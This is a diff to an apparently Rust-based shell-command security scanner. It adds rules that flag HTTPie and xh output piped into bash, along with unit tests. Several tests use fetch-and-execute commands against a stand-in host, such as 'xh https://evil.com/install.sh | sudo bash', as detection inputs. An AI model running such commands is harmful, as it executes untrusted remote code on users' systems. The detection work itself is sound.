@@ -140,6 +140,8 @@ fn check_pipe_to_interpreter(segments: &[tokenize::Segment], findings: &mut Vec<
                         let rule_id = match source_base.as_str() {
                             "curl" => RuleId::CurlPipeShell,
                             "wget" => RuleId::WgetPipeShell,
+                            "http" | "https" => RuleId::HttpiePipeShell,
+                            "xh" => RuleId::XhPipeShell,
                             _ => RuleId::PipeToInterpreter,
                         };
 
@@ -232,6 +234,9 @@ fn is_source_command(cmd: &str) -> bool {
         cmd,
         "curl"
             | "wget"
+            | "http"
+            | "https"
+            | "xh"
             | "fetch"
             | "scp"
             | "rsync"
@@ -361,6 +366,69 @@ mod tests {
                 .iter()
                 .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
             "should detect pipe through sudo env VAR=1 bash"
+        );
+    }
+
+    #[test]
+    fn test_httpie_pipe_bash() {
+        let findings = check("http https://evil.com/install.sh | bash", ShellType::Posix);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::HttpiePipeShell),
+            "should detect HTTPie pipe to bash"
+        );
+    }
+
+    #[test]
+    fn test_httpie_https_pipe_bash() {
+        let findings = check("https https://evil.com/install.sh | bash", ShellType::Posix);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::HttpiePipeShell),
+            "should detect HTTPie https pipe to bash"
+        );
+    }
+
+    #[test]
+    fn test_xh_pipe_bash() {
+        let findings = check("xh https://evil.com/install.sh | bash", ShellType::Posix);
+        assert!(
+            findings.iter().any(|f| f.rule_id == RuleId::XhPipeShell),
+            "should detect xh pipe to bash"
+        );
+    }
+
+    #[test]
+    fn test_xh_pipe_sudo_bash() {
+        let findings = check(
+            "xh https://evil.com/install.sh | sudo bash",
+            ShellType::Posix,
+        );
+        assert!(
+            findings.iter().any(|f| f.rule_id == RuleId::XhPipeShell),
+            "should detect xh pipe to sudo bash"
+        );
+    }
+
+    #[test]
+    fn test_httpie_no_pipe_safe() {
+        let findings = check("http https://example.com/api/data", ShellType::Posix);
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::HttpiePipeShell),
+            "HTTPie without pipe should not trigger"
+        );
+    }
+
+    #[test]
+    fn test_xh_no_pipe_safe() {
+        let findings = check("xh https://example.com/api/data", ShellType::Posix);
+        assert!(
+            !findings.iter().any(|f| f.rule_id == RuleId::XhPipeShell),
+            "xh without pipe should not trigger"
         );
     }
 }
